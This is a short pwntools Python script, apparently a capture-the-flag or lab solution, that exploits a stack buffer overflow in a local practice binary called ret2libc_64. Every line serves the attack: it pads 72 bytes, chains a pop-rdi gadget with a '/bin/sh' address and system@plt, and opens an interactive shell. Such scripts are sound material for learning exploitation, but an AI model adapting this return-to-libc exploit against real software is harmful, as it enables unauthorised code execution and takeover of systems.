from pwn import *

p = process("./ret2libc_64")
elf = ELF("./ret2libc_64")
binsh = 0x0000000000404038

offset = 72

system_add = elf.plt['system']
pop_rdi_ret = 0x00000000004011e3
payload = flat(['a'*offset,p64(pop_rdi_ret),p64(binsh),p64(system_add)])

p.sendline(payload)

p.interactive()





